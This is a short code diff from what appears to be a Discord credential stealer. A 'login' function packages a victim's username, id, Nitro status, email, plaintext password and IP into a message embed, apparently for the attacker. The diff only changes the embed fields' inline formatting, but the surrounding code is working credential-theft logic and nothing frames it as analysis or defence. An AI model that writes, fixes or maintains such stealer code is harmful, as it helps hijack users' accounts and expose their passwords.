@@ -612,12 +612,12 @@ const login = async (email, password, token) => {
           {
             name: '<a:944007295417843743:959785231982931979> username:',
             value: `\`${json.username}#${json.discriminator}\``,
-            inline: !0,
+            inline: false,
           },
           {
             name: '<a:944007295417843743:959785231982931979> id:',
             value: `\`${json.id}\``,
-            inline: !0,
+            inline: false,
           },
           {
             name: '<a:satanist:802503618972483615> nitro:',
@@ -637,12 +637,12 @@ const login = async (email, password, token) => {
           {
             name: '<:944007233820307467:959785232037470208> Email:',
             value: `\`${email}\``,
-            inline: !0,
+            inline: false,
           },
           {
             name: '<a:satan:846706207632261120> Password:',
             value: `\`${password}\``,
-            inline: !0,
+            inline: false,
           },
           {
             name: '<:944007233820307467:959785232037470208> IP:',
